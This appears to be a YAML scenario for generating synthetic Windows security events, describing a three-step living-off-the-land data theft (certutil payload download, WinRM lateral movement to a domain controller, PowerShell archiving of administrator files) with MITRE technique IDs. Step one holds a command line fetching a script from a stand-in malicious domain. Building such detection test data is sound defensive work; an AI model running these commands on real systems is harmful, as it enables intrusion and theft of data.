name: "Vector 4: Living off the Land (LotL) Data Theft"
description: "Атака, использующая исключительно встроенные в ОС утилиты. Злоумышленник загружает скрипт с помощью certutil.exe на PC Директора, удаленно перемещается на запасной контроллер домена AD03 и использует PowerShell для архивации и кражи данных."
global_context:
  host.name: "PC-DIRECTOR"
  host.domain: "corp.local.uz"
  user.name: "director"
steps:
  - id: "v4_step1_certutil_download"
    template: "win_security_4688"
    description: "Использование легитимной утилиты certutil.exe для скрытого скачивания полезной нагрузки."
    delay_from_prev: "0s"
    fields:
      host_name: "PC-DIRECTOR"
      host_ip: "192.168.100.24"
      user_name: "director"
      user_domain: "corp.local.uz"
      process_name: "C:\\Windows\\System32\\certutil.exe"
      parent_path: "C:\\Windows\\System32\\cmd.exe"
      process_command_line: "certutil.exe -urlcache -split -f http://malicious-domain.com/script.ps1 C:\\Users\\director\\AppData\\Local\\Temp\\script.ps1"
      mitre_technique: "T1105"

  - id: "v4_step2_winrm_lateral"
    template: "win_security_4624"
    description: "Удаленный запуск команд на AD03 с использованием легитимного протокола WinRM (Windows Remote Management)."
    delay_from_prev: "10m"
    depends_on: "v4_step1_certutil_download"
    fields:
      host_name: "AD03"
      host_ip: "192.168.100.3"
      source_ip: "192.168.100.24"
      user_name: "director"
      user_domain: "corp.local.uz"
      logon_type: 3
      mitre_technique: "T1021.006"

  - id: "v4_step3_powershell_collection"
    template: "win_security_4688"
    description: "Архивация конфиденциальных данных с использованием встроенного командлета PowerShell Compress-Archive перед выгрузкой."
    delay_from_prev: "5m"
    depends_on: "v4_step2_winrm_lateral"
    fields:
      host_name: "AD03"
      host_ip: "192.168.100.3"
      user_name: "director"
      user_domain: "corp.local.uz"
      process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      parent_path: "C:\\Windows\\System32\\wsmprovhost.exe"
      process_command_line: "powershell.exe -Command \"Compress-Archive -Path C:\\Users\\Administrator\\Desktop\\* -DestinationPath C:\\Windows\\Temp\\backup.zip\""
      mitre_technique: "T1560.001"
